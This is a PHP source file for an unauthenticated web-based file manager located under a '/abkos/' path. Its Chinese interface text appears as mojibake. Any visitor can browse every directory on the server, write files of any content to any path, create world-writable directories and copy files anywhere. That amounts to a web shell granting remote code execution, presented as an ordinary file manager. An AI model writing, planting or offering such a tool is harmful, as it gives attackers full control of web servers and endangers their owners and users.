/abkos/
<?php
$current = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current || !is_dir($current)) $current = getcwd();
$parent = dirname($current);

$items = scandir($current);  // è·å–å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹

$createFileMsg = ''; 

if (isset($_POST['create_file'])) {
    $newFilePath = trim($_POST['new_file_path']);
    $newFileContent = $_POST['new_file_content'];
    if (!empty($newFilePath)) {
        $newDir = dirname($newFilePath);
        if (!is_dir($newDir)) mkdir($newDir, 0777, true);
        if (file_put_contents($newFilePath, $newFileContent) !== false) {
            $createFileMsg = "<div style='padding:10px; background:#d4edda; color:#155724; border-radius:5px; margin-bottom:20px;'>âœ… åˆ›å»ºæ–‡ä»¶æˆåŠŸï¼š<code>$newFilePath</code></div>";
            // é‡æ–°è¯»å–ç›®å½•å†…å®¹ï¼Œæ˜¾ç¤ºæ–°æ–‡ä»¶
            $items = scandir($current);
        } else {
            $createFileMsg = "<div style='padding:10px; background:#f8d7da; color:#721c24; border-radius:5px; margin-bottom:20px;'>âŒ å†™å…¥å¤±è´¥ï¼š<code>$newFilePath</code></div>";
        }
    } else {
        $createFileMsg = "<div style='padding:10px; background:#fff3cd; color:#856404; border-radius:5px; margin-bottom:20px;'>âš ï¸ æ–‡ä»¶è·¯å¾„ä¸èƒ½ä¸ºç©º</div>";
    }
}

if (isset($_POST['copy_files'])) {
    $sourceFilesRaw = trim($_POST['source_files']);
    $targetDirsRaw = trim($_POST['target_dirs']);

    $sourceFiles = array_filter(array_map('trim', explode("\n", $sourceFilesRaw)));
    $targetDirs  = array_filter(array_map('trim', explode("\n", $targetDirsRaw)));

    foreach ($sourceFiles as $sourceFile) {
        if (!file_exists($sourceFile)) continue;
        $filename = basename($sourceFile);
        foreach ($targetDirs as $targetDir) {
            $targetDir = rtrim($targetDir, '/') . '/';
            if (!is_dir($targetDir)) mkdir($targetDir, 0777, true);
            copy($sourceFile, $targetDir . $filename);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>æ–‡ä»¶ç®¡ç†å™¨</title>
    <style>
        body { font-family: Arial; padding: 30px; background: #f3f3f3; }
        .container { background: white; padding: 20px; border-radius: 10px; width: 800px; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; }
        input[type="submit"] { width: auto; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        input[type="submit"]:hover { background: #0056b3; }
        code { background: #f8f8f8; padding: 2px 4px; border-radius: 3px; }
        ul { list-style: none; padding-left: 0; }
        li { padding: 5px 0; }
    </style>
</head>
<body>

<div style="padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ccc; margin-bottom: 20px;">
    <strong>ğŸ“‚ å½“å‰ç›®å½•ï¼š</strong>
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, trim($current, DIRECTORY_SEPARATOR));
    $pathAcc = DIRECTORY_SEPARATOR === '\\' ? '' : '/';

    if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $parts[0])) {
        $pathAcc = array_shift($parts);
        echo '<a href="?dir=' . urlencode($pathAcc . DIRECTORY_SEPARATOR) . '">' . htmlspecialchars($pathAcc) . '</a>';
        if (!empty($parts)) echo ' / ';
        $pathAcc .= DIRECTORY_SEPARATOR;
    }

    foreach ($parts as $i => $part) {
        $pathAcc .= $part . DIRECTORY_SEPARATOR;
        $link = realpath($pathAcc);
        if ($link) {
            echo '<a href="?dir=' . urlencode($link) . '">' . htmlspecialchars($part) . '</a>';
            if ($i < count($parts) - 1) echo ' / ';
        }
    }
    ?>
    <?php if ($current !== '/') : ?>
        <div style="margin-top: 5px;">
            ğŸ”™ <a href="?dir=<?= urlencode($parent) ?>">è¿”å›ä¸Šçº§ç›®å½•</a>
        </div>
    <?php endif; ?>
</div>

<div class="container">
    <h2>å½“å‰ç›®å½•æ–‡ä»¶åˆ—è¡¨</h2>
    <ul>
        <?php foreach ($items as $item):
            if ($item === '.' || $item === '..') continue;
            $fullPath = $current . DIRECTORY_SEPARATOR . $item;
        ?>
        <li>
            <?php if (is_dir($fullPath)): ?>
                ğŸ“ <a href="?dir=<?= htmlspecialchars($fullPath) ?>"><?= htmlspecialchars($item) ?>/</a>
            <?php else: ?>
                ğŸ“„ <?= htmlspecialchars($item) ?>
            <?php endif; ?>
        </li>
        <?php endforeach; ?>
    </ul>
</div>

<div class="container">
    <h2>ğŸ“ æ‰¹é‡å¤åˆ¶æ–‡ä»¶</h2>
    <form method="post">
        <label>æºæ–‡ä»¶è·¯å¾„ï¼ˆæ¯è¡Œä¸€ä¸ªï¼‰</label>
        <textarea name="source_files" rows="6" required></textarea>
        <label>ç›®æ ‡ç›®å½•è·¯å¾„ï¼ˆæ¯è¡Œä¸€ä¸ªï¼‰</label>
        <textarea name="target_dirs" rows="6" required></textarea>
        <input type="submit" name="copy_files" value="æ‰¹é‡å¤åˆ¶">
    </form>
</div>

<div class="container">
    <h2>ğŸ“ æ–°å»ºæ–‡ä»¶</h2>
    <?= $createFileMsg ?>
    <form method="post">
        <label>ğŸ“„ æ–‡ä»¶å®Œæ•´è·¯å¾„</label>
        <input type="text" name="new_file_path" placeholder="/path/to/file.txt" required>
        <label>ğŸ“‹ æ–‡ä»¶å†…å®¹</label>
        <textarea name="new_file_content" rows="5" required></textarea>
        <input type="submit" name="create_file" value="åˆ›å»ºæ–‡ä»¶">
    </form>
</div>

</body>
</html>
